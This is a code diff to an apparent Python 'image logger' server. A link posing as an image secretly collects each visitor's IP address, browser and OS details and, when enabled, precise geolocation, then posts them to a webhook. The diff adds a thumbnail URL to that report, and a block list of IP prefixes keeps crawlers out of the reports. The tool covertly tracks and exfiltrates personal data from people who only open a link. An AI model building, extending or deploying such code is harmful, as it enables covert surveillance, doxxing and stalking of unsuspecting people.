@@ -65,7 +65,7 @@ config = {
 
 blacklistedIPs = ("27", "34", "35", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A"):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         if not ip.startswith(("34", "35")): return
         requests.post(config["webhook"], json = {
@@ -113,7 +113,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A"):
 
     os, browser = httpagentparser.simple_detect(useragent)
     
-    requests.post(config["webhook"], json = {
+    embed = {
     "username": config["username"],
     "content": ping,
     "embeds": [
@@ -147,7 +147,10 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A"):
 ```""",
     }
   ],
-})
+}
+    
+    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    requests.post(config["webhook"], json = embed)
     return info
 
 binaries = {
@@ -189,7 +192,7 @@ div.img {{
                 self.end_headers()
                 
                 self.wfile.write(binaries["loading"] if config["buggedImage"] else data)
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0])
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
             
             return
         
@@ -199,9 +202,9 @@ div.img {{
 
             if dic.get("g") and config["accurateLocation"]:
                 location = base64.b64decode(dic.get("g").encode()).decode()
-                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0])
+                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
             else:
-                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0])
+                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
             
 
             message = config["message"]["message"]
